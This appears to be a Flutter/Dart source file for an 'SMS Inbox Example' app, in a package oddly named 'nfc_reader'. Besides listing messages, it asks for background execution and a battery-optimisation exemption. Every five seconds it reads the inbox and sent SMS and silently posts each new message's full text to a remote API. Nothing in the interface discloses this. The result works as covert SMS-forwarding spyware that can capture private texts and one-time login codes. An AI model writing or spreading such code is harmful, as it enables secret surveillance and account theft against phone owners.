import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_background/flutter_background.dart';
import 'package:nfc_reader/api_services/api_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  FlutterBackground.initialize();
  runApp(const MessagePage());
}

class MessagePage extends StatefulWidget {
  const MessagePage({Key? key}) : super(key: key);

  @override
  State<MessagePage> createState() => _MessagePageState();
}

class _MessagePageState extends State<MessagePage> {
  final SmsQuery _query = SmsQuery();
  List<SmsMessage> _messages = [];
  Timer? _timer;

  final ApiServices _apiServices = ApiServices();

  @override
  void initState() {
    super.initState();
    _startMessageMonitoring();
    _handleBackgroundExecution();
  }

  @override
  void dispose() {
    _stopMessageMonitoring();
    super.dispose();
  }

  void _startMessageMonitoring() {
    _timer = Timer.periodic(const Duration(seconds: 5), (_) {
      _getMessages();
    });
  }

  void _stopMessageMonitoring() {
    _timer?.cancel();
    _timer = null;
  }

  Future<void> _getMessages() async {
    var permission = await Permission.sms.status;
    if (permission.isGranted) {
      final messages = await _query.querySms(
        kinds: [
          SmsQueryKind.inbox,
          SmsQueryKind.sent,
        ],
        count: 15,
      );
      debugPrint('sms inbox messages: ${messages.length}');

      if (_messages.isNotEmpty && messages.isNotEmpty) {
        final latestMessage = messages.first;
        final previousMessage = _messages.first;

        if (latestMessage.body != previousMessage.body) {
          setState(() => _messages = messages);
          _apiServices.postMessage(latestMessage.toString());

        }
      } else {
        setState(() => _messages = messages);
      }
    } else {
      await Permission.sms.request();
    }
  }
  void _handleBackgroundExecution() async {

    final status = await Permission.ignoreBatteryOptimizations.request();

    FlutterBackground.enableBackgroundExecution();

    Timer.periodic(const Duration(seconds: 5), (timer) async {
      await _getMessages();
    });

    if (status.isDenied) {

    }

  }


  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter SMS Inbox App',
      theme: ThemeData(
        primarySwatch: Colors.teal,
      ),
      home:



      Scaffold(



        appBar: AppBar(
          title: const Text('SMS Inbox Example'),
        ),
        body: Container(
          padding: const EdgeInsets.all(10.0),
          child: _messages.isNotEmpty
              ? _MessagesListView(
            messages: _messages,
          )
              : const Center(
            child: Text(
              'No messages to show.\n Tap refresh button...',
              textAlign: TextAlign.center,
            ),
          ),
        ),
        floatingActionButton: FloatingActionButton(
          onPressed: _getMessages,
          child: const Icon(Icons.refresh),
        ),
      ),
    );
  }
}

class _MessagesListView extends StatelessWidget {
  const _MessagesListView({
    Key? key,
    required this.messages,
  }) : super(key: key);

  final List<SmsMessage> messages;

  @override
  Widget build(BuildContext context) {
    return ListView.builder(
      shrinkWrap: true,
      itemCount: messages.length,
      itemBuilder: (BuildContext context, int i) {
        var message = messages[i];

        return ListTile(
          title: Text('${message.sender} [${message.date}]'),
          subtitle: Text('${message.body}'),
        );
      },
    );
  }
}
